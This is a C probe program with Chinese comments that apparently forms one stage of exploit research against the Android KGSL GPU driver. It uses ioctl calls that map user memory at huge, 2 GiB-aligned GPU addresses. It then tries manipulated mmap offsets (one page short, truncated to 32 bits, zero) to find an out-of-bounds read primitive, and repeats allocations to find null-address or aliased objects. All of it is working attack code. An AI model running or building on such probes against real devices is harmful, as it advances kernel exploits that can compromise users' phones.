/* kgsl_a2b.c — A2 续: 巨大 gpuaddr 的两个可疑面   §CQ
 *
 * A2 已确认: MAP_USER_MEM(len<64KB) 接受对齐指数 31 => VA 以 2GiB 为步长摆放 (间距 0x80000000)
 *           (GPUOBJ_ALLOC 在同位置有 <=0x180000 上界, 该路径无)
 *
 * 本探针测两件事:
 *   [1] mmap 校验面: 对象 gpuaddr 落在 0x4080000000 这种高位后,
 *       用 offset = gpuaddr - 0x3FFFFFF000 做 mmap —— 看 内核的 offset->gpuaddr 反算
 *       是否存在 32 位截断/范围校验绕过 (若能映射到不属于本对象的内容 = 越界读原语)
 *   [2] 分配器退化面: 反复以指数 31 分配(每次吃 2GiB VA), 观察
 *       - 是否出现 ret=0 但 gpuaddr==0 的"成功却无 VA"(= 真正的 NULL-VA 对象)
 *       - 是否出现重复 gpuaddr (别名)
 *       - VA 耗尽时的错误码
 *
 * 安全: 只做映射与 mmap, 不下发任何 GPU 命令; 每步 canary, oops 会重启设备。
 */
#define __BIONIC_DEPRECATED_PAGE_SIZE_MACRO
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <string.h>

#define CMD_MAP_USER_MEM  0xc0300915u
#define CMD_DEV_GETPROP   0xc0180902u
#define MEMTYPE_ADDR      2
#define MMAP_BASE         0x3ffffff000ULL

static int g_fd = -1;

static int alive(void) {
    int f = open("/dev/kgsl-3d0", O_RDWR);
    if (f < 0) { printf("      [canary] open 失败 errno=%d\n", errno); return 0; }
    unsigned char p[24]; memset(p, 0, sizeof(p));
    *(uint32_t *)p = 1;
    errno = 0;
    int r = ioctl(f, CMD_DEV_GETPROP, p);
    printf("      [canary] ret=%d errno=%d\n", r, errno);
    close(f);
    return 1;
}

static unsigned long long do_map(void *host, unsigned long long len,
                                 unsigned int flags, int *pret, int *perrno) {
    unsigned char b[48];
    memset(b, 0, sizeof(b));
    *(int32_t  *)(b + 0x00) = -1;
    *(uint64_t *)(b + 0x10) = len;
    *(uint64_t *)(b + 0x18) = 0;
    *(uint64_t *)(b + 0x20) = (uint64_t)(uintptr_t)host;
    *(uint32_t *)(b + 0x28) = MEMTYPE_ADDR;
    *(uint32_t *)(b + 0x2c) = flags;
    errno = 0;
    int r = ioctl(g_fd, CMD_MAP_USER_MEM, b);
    *pret = r; *perrno = errno;
    uint64_t ga = 0; memcpy(&ga, b + 0x08, 8);
    return ga;
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("=== kgsl_a2b: 巨大 gpuaddr 的 mmap 校验 + 分配器退化 ===\n");

    g_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (g_fd < 0) { printf("open 失败 errno=%d\n", errno); return 1; }
    void *host = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (host == MAP_FAILED) { printf("mmap host 失败 errno=%d\n", errno); return 1; }
    memset(host, 0x41, 0x2000);
    printf("fd=%d host=%p\n\n", g_fd, host);

    /* ---------- [1] mmap 校验面 ---------- */
    printf("== [1] mmap offset->gpuaddr 反算校验 (exp=31 高位对象) ==\n");
    {
        int r, e;
        unsigned long long ga = do_map(host, 0x1000, 0x001f0000u, &r, &e);
        printf("  alloc exp=31: ret=%d errno=%d gpuaddr=0x%llx\n", r, e, ga);
        if (r == 0) {
            unsigned long long off = ga - MMAP_BASE;
            printf("  期望 mmap offset = 0x%llx\n", off);

            /* 1a) 正确 offset */
            errno = 0;
            void *p = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, g_fd,
                           (off_t)off);
            printf("  1a) 正确 offset           -> %p errno=%d\n", p, errno);
            if (p != MAP_FAILED) {
                memset(p, 0x5a, 0x1000);
                printf("      写后读回 [0]=0x%02x\n", *(unsigned char *)p);
                munmap(p, 0x1000);
            }

            /* 1b) offset 故意少 1 页(落在对象之前) */
            errno = 0;
            p = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, g_fd,
                     (off_t)(off - 0x1000));
            printf("  1b) offset-4K (对象之外)   -> %p errno=%d\n", p, errno);
            if (p != MAP_FAILED) { printf("      !! 竟然映射成功\n"); munmap(p, 0x1000); }

            /* 1c) offset 截断到 32 位(模拟 32 位反算路径) */
            errno = 0;
            p = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, g_fd,
                     (off_t)(off & 0xffffffffULL));
            printf("  1c) offset 截断到 32 位    -> %p errno=%d\n", p, errno);
            if (p != MAP_FAILED) { printf("      !! 竟然映射成功\n"); munmap(p, 0x1000); }

            /* 1d) offset = 0 */
            errno = 0;
            p = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, g_fd, 0);
            printf("  1d) offset=0               -> %p errno=%d\n", p, errno);
            if (p != MAP_FAILED) { munmap(p, 0x1000); }
        }
        alive();
    }

    /* ---------- [2] 分配器退化面: 反复吃 2GiB VA ---------- */
    printf("\n== [2] exp=31 重复分配 (每次吃约 2GiB VA) ==\n");
    {
        unsigned long long seen[48];
        int n = 0, zero_success = 0, dup = 0, fail_code = 0;
        for (int i = 0; i < 16; i++) {
            int r, e;
            unsigned long long ga = do_map(host, 0x1000, 0x001f0000u, &r, &e);
            printf("  [%2d] ret=%d errno=%-3d gpuaddr=0x%llx", i, r, e, ga);
            for (int k = 0; k < n; k++) if (seen[k] == ga) { printf("  <== 重复!"); dup++; }
            if (r == 0) {
                if (ga == 0) { printf("  <== 成功但 gpuaddr==0 !!"); zero_success++; }
                seen[n++] = ga;
            } else {
                fail_code = e;
                printf("  (分配失败, 提前结束)");
                printf("\n");
                break;
            }
            printf("\n");
            alive();
        }
        printf("  汇总: 成功 %d 次, gpuaddr==0 的成功 %d 次, 重复 %d 次, 失败 errno=%d\n",
               n, zero_success, dup, fail_code);
    }

    printf("\n=== 完成, 设备存活 ===\n");
    close(g_fd);
    return 0;
}
